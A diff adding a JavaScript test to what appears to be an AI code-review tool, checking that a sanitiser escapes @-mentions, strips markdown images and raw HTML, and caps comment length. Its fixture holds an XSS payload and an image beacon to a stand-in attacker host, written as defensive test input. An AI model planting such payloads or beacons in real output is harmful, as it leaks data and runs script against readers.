@@ -168,6 +168,26 @@ test("the same defect reworded is the same finding, and a re-rating is not", () 
   assert.equal(original.marker, reindented.marker);
 });
 
+test("a body cannot mention, beacon or run long", () => {
+  const { posted } = buildReview({
+    findings: [
+      {
+        ...findings[0],
+        body:
+          "ping @acme/security <img src=x onerror=alert(1)> ![beat](https://attacker.example/p?host=x) " +
+          "and then a great deal of padding ".repeat(200),
+      },
+    ],
+    diff: DIFF,
+  });
+  const body = posted[0].body;
+  assert.ok(!/(?<!\\)@/.test(body), "every @ is escaped, so it cannot ping anyone");
+  assert.ok(!body.includes("!["), "no image syntax: a remote image beacon is the leak");
+  assert.ok(!/<img/i.test(body), "no raw HTML");
+  assert.ok(body.length < 2200, "a body is capped");
+  assert.match(body, /<!-- ai-review:[0-9a-f]{16} -->$/, "the marker survives the sanitiser");
+});
+
 test("the summary names uncovered files and counts dropped findings", () => {
   const { posted, dropped } = buildReview({ findings, diff: DIFF });
   const text = summarise({ posted, dropped, uncovered: ["src/services/scores.test.ts"], turns: 12 });
